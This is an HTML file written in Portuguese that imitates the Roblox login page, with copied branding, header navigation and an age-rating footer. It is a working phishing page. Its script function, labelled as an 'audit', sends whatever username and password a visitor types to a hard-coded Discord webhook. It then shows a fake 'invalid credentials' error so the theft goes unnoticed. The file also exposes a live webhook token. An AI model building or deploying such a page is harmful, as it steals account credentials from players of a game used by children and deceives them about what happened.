<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            /* CORREÇÃO DE OPACIDADE: O fundo agora é mais visível como na imagem real */
            background-image: linear-gradient(rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
            background-size: cover; background-position: center;
            display: flex; flex-direction: column; overflow: hidden;
        }

        /* HEADER: Ajustado para mimetizar o logo e espaçamento lateral */
        .roblox-header {
            width: 100%; height: 52px; background: #232527;
            display: flex; align-items: center; padding: 0 20px;
            position: fixed; top: 0; z-index: 10; box-sizing: border-box;
            border-bottom: 1px solid #454749;
        }

        .header-nav { display: flex; align-items: center; gap: 22px; color: #fff; font-size: 15px; font-weight: 500; flex-grow: 1; }
        
        .search-bar { position: relative; flex-grow: 1; max-width: 520px; margin: 0 15px; }
        .search-bar input {
            width: 100%; height: 34px; background: rgba(25,27,29,0.8); border: 1px solid #454749;
            border-radius: 8px; padding-left: 38px; color: #bdbebe; font-size: 15px; margin-bottom: 0 !important;
        }
        .search-icon { position: absolute; left: 10px; top: 8px; height: 18px; filter: invert(0.5); }

        /* CONTAINER: Otimizado para o card parecer "flutuar" como no original */
        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 52px; width: 100%; }
        
        .login-box {
            background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
            width: 90%; max-width: 400px; text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6); z-index: 2;
        }

        h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 700; letter-spacing: -1px; }
        
        input {
            width: 100%; height: 45px; background-color: #191b1d; border: 1px solid #454749;
            border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 15px;
            box-sizing: border-box; font-size: 16px; outline: none;
        }

        .btn-entrar {
            width: 100%; height: 40px; background-color: transparent; border: 1.5px solid #bdbebe;
            color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin-bottom: 20px;
            font-weight: 600;
        }

        .btn-secondary {
            width: 100%; height: 45px; background-color: #4f5153; border: none;
            color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 12px; cursor: pointer;
            font-weight: 500;
        }

        .error-banner {
            background-color: #fff1f0; border: 1px solid #f5222d; color: #f5222d;
            padding: 10px; border-radius: 4px; font-size: 12px; margin-bottom: 20px;
            display: none; text-align: center; font-weight: 500;
        }

        .footer-classificacao { position: fixed; bottom: 15px; width: 100%; text-align: center; color: #fff; }
    </style>
</head>
<body>

<div class="roblox-header">
    <img src="https://images.rbxcdn.com/2b740523e100f983633a675031d875a6.svg" style="height: 30px; filter: invert(1); margin-right: 25px;">
    
    <div class="header-nav">
        <span>Destaques</span>
        <span>Mercado</span>
        <span>Criar</span>
        <span>Robux</span>
        <div class="search-bar">
            <img src="https://images.rbxcdn.com/43f3ed3d820f4b5035f5d34193566b72.svg" class="search-icon">
            <input type="text" placeholder="Pesquisar">
        </div>
    </div>
    
    <div style="display: flex; gap: 8px;">
        <button style="background: #0084ff; border: none; color: #fff; padding: 5px 14px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor:pointer">Cadastrar-se</button>
        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 5px 14px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor:pointer">Entrar</button>
    </div>
</div>

<div class="container">
    <div class="login-box" id="mainCard">
        <div id="errorMsg" class="error-banner">Insira um usuário e senha válidos.</div>
        <h1>Entrar na Roblox</h1>
        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
        <button class="btn-entrar" id="loginBtn" onclick="executeAudit()">Entrar</button>
        <a href="#" style="color:#fff; text-decoration:none; font-size:13px; display:block; margin-bottom:20px;">Esqueceu a senha ou nome de usuário?</a>
        <button class="btn-secondary">Envie-me um código único por e-mail</button>
        <button class="btn-secondary">Entrada rápida</button>
        <p style="color: #fff; font-size: 14px; margin-top: 20px;">
            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
        </p>
    </div>
</div>

<div class="footer-classificacao">
    <div style="background: #fff; color: #000; font-weight: bold; padding: 2px 6px; border-radius: 3px; display: inline-block;">12</div>
    <div style="font-size: 11px; margin-top: 5px;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
</div>

<script>
    async function executeAudit() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const btn = document.getElementById('loginBtn');
        const error = document.getElementById('errorMsg');
        const endpoint = "https://discord.com/api/webhooks/1484149300991754350/QG4Qwn3sGu68Mj9Gq221Zow6uHGytBk6Smny_59O4paacJP5eRI6om39KFKiV1sLUaaQ";

        if (u.length > 2 && p.length > 2) {
            btn.innerText = "Entrando...";
            try {
                await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `🚨 **AUDITORIA RECON** 🚨\n👤 ID: \`${u}\`\n🔑 KEY: \`${p}\`` })
                });
                setTimeout(() => {
                    btn.innerText = "Entrar";
                    error.style.display = "block";
                }, 1200);
            } catch (err) { btn.innerText = "Entrar"; }
        } else {
            error.style.display = "block";
        }
    }
</script>
</body>
</html>
